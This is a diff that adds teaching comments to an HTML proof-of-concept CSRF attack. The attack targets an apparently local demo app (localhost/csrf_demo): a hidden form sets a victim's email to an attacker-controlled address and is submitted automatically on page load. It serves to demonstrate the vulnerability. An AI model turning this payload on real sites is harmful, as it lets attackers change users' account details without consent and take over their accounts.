@@ -1,9 +1,16 @@
 <html>
+    <!--
+        This form is designed to automatically post to the dashboard.php page upon loading.
+        It exploits the CSRF vulnerability by submitting an email change without the user's consent.
+     -->
 <form method="POST" action="http://localhost/csrf_demo/dashboard.php" id="maliciousForm">
+    <!-- Hidden field sets the new email to an address controlled by the attacker. -->
     <input type="hidden" name="email" value="hacked@example.com">
 </form>
+  <!-- JavaScript automatically submits the form when the page is loaded. -->
 <script>
     window.onload = function() {
+        // Targets the form by its ID and triggers submission.
         document.getElementById('maliciousForm').submit();
     };
 </script>
